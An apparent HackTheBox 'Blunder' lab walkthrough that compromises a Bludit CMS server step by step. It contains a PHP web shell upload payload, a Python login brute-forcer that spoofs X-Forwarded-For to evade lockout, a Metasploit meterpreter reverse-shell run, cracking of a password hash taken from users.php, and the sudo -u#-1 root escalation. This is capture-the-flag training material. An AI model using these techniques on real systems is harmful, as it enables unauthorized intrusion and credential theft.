---
title: "HackTheBox: Blunder | Walkthrough"
date: 2020-10-17
categories: [hackthebox]
tags: [linux, bludit, web, bruteforce, privesc]
---

## Recon

Starting with an nmap scan:

```bash
nmap -A 10.10.10.191 -o nmap
````

Output:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-31 17:45 +0545
Nmap scan report for 10.10.10.191
Host is up (0.38s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp closed ftp
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
Aggressive OS guesses: Linux variants (various)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

Only port 80 is open, but let's run a full port scan to ensure we don't miss anything:

```bash
nmap -p- -A -T4 10.10.10.191 -o allports
```

In the meantime, let's check the website and run some content discovery:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.191/FUZZ -t 500
```

Exploring the website, we notice JS files under `/bl-kernel/js/`, indicating the site is running **Bludit CMS**.

## Content Discovery

FFUF results:

```
.htaccess        [Status: 403]
.htpasswd        [Status: 403]
LICENSE          [Status: 200]
about            [Status: 200]
admin            [Status: 301]
cgi-bin/         [Status: 301]
robots.txt       [Status: 200]
server-status    [Status: 403]
usb              [Status: 200]
```

* `/admin` shows a login portal (default credentials fail).
* We also find `/todo.txt` with a username: `fergus`.

## Exploit Search

Searching for Bludit exploits:

```bash
searchsploit Bludit
```

We find:

* **Bludit - Directory Traversal / Image File Upload (Metasploit)**
* **Bludit Pages Editor 3.0.0 - Arbitrary File Upload**

We can try the non-Metasploit exploit first (`46060.txt`) which uses:

```http
POST /admin/ajax/upload-files HTTP/1.1
Host: <host>
Content-Disposition: form-data; name="bluditInputFiles[]"; filename="poc.php"
<?php system($_GET["cmd"]);?>
```

It requires authentication, so we need credentials.

## Bruteforce Credentials

Using **todo.txt**, we know the username is `fergus`.

Python bruteforce script (`bruteforce.py`):

```python
import re
import requests

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'

wordlist = []
with open("blundercewl_wordlist.txt","r", errors="ignore") as file:
    for line in file:
        wordlist.append(line.rstrip())

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0',
        'Referer': login_url
    }
    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }
    login_result = session.post(login_url, headers=headers, data=data, allow_redirects=False)
    if 'location' in login_result.headers and '/admin/dashboard' in login_result.headers['location']:
        print(f"SUCCESS: {username}:{password}")
        break
```

Generate wordlist:

```bash
cewl http://10.10.10.191/ -w blundercewl_wordlist.txt -m 8
```

Running the script reveals the password:

```
RolandDeschain
```

## Getting a Meterpreter Shell

Use the Metasploit module:

```bash
msfconsole
use exploit/linux/http/bludit_upload_images_exec
set rhosts 10.10.10.191
set bludituser fergus
set bluditpass RolandDeschain
set payload php/meterpreter/reverse_tcp
set lhost 10.10.14.21
run
```

We now have a **meterpreter shell**.

Exploring `/home`:

```
hugo
shaun
```

## Extracting Password Hashes

Check Bludit database for users:

```bash
cd /var/www/bludit-3.10.0a/bl-content/databases
cat users.php
```

Found hash for `hugo`:

```
faca404fd5c0a31cf1897b823c695c85cffeb98d
```

Cracking it using CrackStation gives:

```
Password120
```

Switch to Hugo:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
export SHELL=bash
su - hugo
# Password: Password120
```

## Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

Output:

```
User hugo may run the following commands on blunder: (ALL, !root) /bin/bash
```

Exploit sudo trick to gain root:

```bash
sudo -u#-1 /bin/bash
```

We now have **root access**! 🎉

